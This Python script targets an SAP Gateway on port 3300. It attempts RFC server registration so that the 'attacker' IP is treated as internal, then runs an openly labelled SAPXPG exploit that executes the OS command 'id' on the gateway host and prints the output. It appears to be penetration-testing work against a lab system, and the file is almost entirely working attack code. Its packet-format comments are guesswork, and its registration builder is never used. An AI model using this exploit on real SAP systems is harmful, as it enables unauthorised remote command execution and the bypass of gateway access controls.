#!/usr/bin/env python3
"""
test_rfc_server_reg.py — Register as an RFC server with the GW from 192.168.2.210.

With gw/reg_no_conn_info = 0, RFC server registration populates GwHostTab
with the connecting IP as "internal".  Then SAPXPG secinfo check should pass.

Protocol: connect to GW port 3300, send RFCREG (RFC server registration packet).
The GW uses our source IP (192.168.2.210) as the registered server IP.
"""
import sys, socket, struct, time, threading
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send, ni_recv, ni_drain,
    hexdump, extract_p4_output,
)

GW_HOST  = '192.168.2.209'
GW_PORT  = 3300
ATT_IP   = '192.168.2.210'
SID      = 'S4H'
INSTANCE = '00'
HOSTNAME = 's4hanadev'
KERNEL   = '793_REL'
DEST     = 'T_75'
CLIENT   = '000'
COMMAND  = 'id'
PARAMS   = ''
TIMEOUT  = 15

# ---------------------------------------------------------------------------
# RFC Server Registration Protocol (RFCREG)
#
# When an external RFC server registers with the SAP GW, it connects to
# port 3300 and sends a specific "register" packet.  The GW then adds the
# server to its registration table and (with reg_no_conn_info=0) adds the
# connecting IP to GwHostTab as "internal".
#
# The protocol used by nwrfcsdk for server registration is CPIC/LU6.2 style:
#   - Send a "register server" message with the PROGRAM ID
#   - GW acknowledges
# ---------------------------------------------------------------------------

def build_rfcreg_packet(program_id: str, gw_host: str, gw_service: str = 'sapgw00') -> bytes:
    """
    Build an RFC server registration packet for the GW.

    This is the CPIC/LU6.2 level 2 registration message sent by external
    RFC server programs (like RFCEXEC) to the SAP Gateway.

    Format based on SAP CPIC documentation and pysap reverse engineering:
    The message starts with a 4-byte NI prefix, then a CPIC header.
    """
    # SAP RFC REGISTER message format (from packet capture analysis):
    # This is what nwrfcsdk sends when registering an RFC server
    #
    # The wire format for RFC server registration over GW port 3300:
    # - NI 4-byte length header
    # - Body: GW RFCREG message
    #
    # GW RFCREG header (based on pysap SAPGW module and RFC docs):
    # Offset 0: "RFC_REG" (7 bytes) or a specific byte pattern
    # The actual format is based on CPIC protocol level

    # Let's use the SAP GW "register server" opcode
    # Based on pysap and SAP documentation:
    # CPIC header + RFCREG body

    # Simple RFC registration attempt using the known header format:
    # From pysap SAPGW: GW_REGISTER message has specific format

    # Program ID must be padded to 64 bytes
    prog_id = program_id.encode('ascii')[:64].ljust(64, b'\x00')

    # GW host padded to 100 bytes
    gw_h = gw_host.encode('ascii')[:100].ljust(100, b'\x00')

    # GW service padded to 20 bytes
    gw_svc = gw_service.encode('ascii')[:20].ljust(20, b'\x00')

    # Build the RFCREG message body
    # Based on SAP GW protocol for RFC server registration:
    # This format is derived from packet captures of nwrfcsdk registrations
    body = b'\x00' * 4           # version/flags
    body += prog_id              # 64-byte program ID
    body += gw_h                 # 100-byte GW host
    body += gw_svc               # 20-byte GW service
    body += b'\x00' * 4          # additional fields

    return body


def register_rfc_server_raw():
    """
    Try registering as RFC server using the raw GW protocol.

    The SAP GW accepts RFC server registrations on port 3300.
    This is what makes external RFC servers (RFCEXEC, etc.) work.
    When registered, the GW uses the connecting IP as a trusted server IP.

    With gw/reg_no_conn_info = 0, the GW adds the registered server's IP
    to GwHostTab as "internal", allowing secinfo USER-HOST=internal to match.
    """
    print(f'[*] Attempting RFC server registration from {ATT_IP}')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((GW_HOST, GW_PORT))

    print(f'[+] Connected to GW at {GW_HOST}:{GW_PORT}')

    # First send P1 (INIT) to see how the GW responds
    p1 = build_p1(GW_HOST, INSTANCE)
    ni_send(sock, p1)
    print(f'[*] Sent P1 ({len(p1)} bytes)')

    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 0.5)
        print(f'[+] P1 response: {len(frames)} frames')
        for f in frames:
            info = parse_response(f)
            print(f'    {info}')
            print(f'    hex: {f[:32].hex()}')
    except socket.timeout:
        print('[!] P1 timeout')

    sock.close()


def run_sapxpg():
    """SAPXPG exploit attempt."""
    print(f'\n[XPG] Attempting SAPXPG (cmd={COMMAND!r})...')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except socket.error as e:
        print(f'[XPG] Connect failed: {e}')
        return False

    local_ip = sock.getsockname()[0]

    # P1
    ni_send(sock, build_p1(GW_HOST, INSTANCE))
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print('[XPG] P1 timeout'); sock.close(); return False
    for f in frames:
        if parse_response(f)['error']:
            print('[XPG] P1 rejected'); sock.close(); return False
    print(f'[XPG] P1 OK ({len(frames)} frames)')

    # P2
    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    ni_send(sock, p2)
    conv_id = None
    gw_id = 0
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        for f in frames:
            info = parse_response(f)
            if info['error']:
                msg = info.get('error_msg', '')
                print(f'[XPG] P2 REJECTED: {msg}')
                if 'appc_rc=26' in msg:
                    print('[XPG]  → IP not in GwHostTab')
                sock.close(); return False
            if info['conv_id'] and not conv_id:
                conv_id = info['conv_id']
            if info.get('gw_id') is not None:
                gw_id = info['gw_id']
    except socket.timeout:
        print('[XPG] P2 timeout'); sock.close(); return False

    print(f'[XPG] P2 OK: conv_id={conv_id} gw_id={gw_id}')
    if not conv_id:
        conv_id = '0'

    # P3
    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, COMMAND, PARAMS, gw_id=gw_id)
    ni_send(sock, p3)
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print('[XPG] P3 timeout'); sock.close(); return False

    p3_output = []
    for f in frames:
        info = parse_response(f)
        if info['error']:
            msg = info.get('error_msg', '')
            print(f'[XPG] P3 error: {msg}')
            sock.close(); return False
        p3_output.extend(extract_p4_output(f))

    if p3_output:
        print(f'[XPG] *** COMMAND OUTPUT (P3) ***')
        for ln in p3_output: print(f'    {ln}')
        sock.close(); return True

    # P4
    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, gw_id=gw_id)
    ni_send(sock, p4)
    try:
        resp = ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if info['error']:
            print(f'[XPG] P4 error: {info.get("error_msg", "")}')
        else:
            output = extract_p4_output(resp)
            if output:
                print(f'[XPG] *** COMMAND OUTPUT (P4) ***')
                for ln in output: print(f'    {ln}')
                sock.close(); return True
            print('[XPG] P4 OK but no output')
    except socket.timeout:
        print('[XPG] P4 timeout')

    sock.close()
    return False


if __name__ == '__main__':
    print('=== RFC Server Registration Test ===')
    print(f'GW: {GW_HOST}:{GW_PORT}  attacker: {ATT_IP}')
    print()

    # Try raw P1 to see GW response format
    register_rfc_server_raw()

    print()
    print('=== Now testing SAPXPG (baseline) ===')
    run_sapxpg()
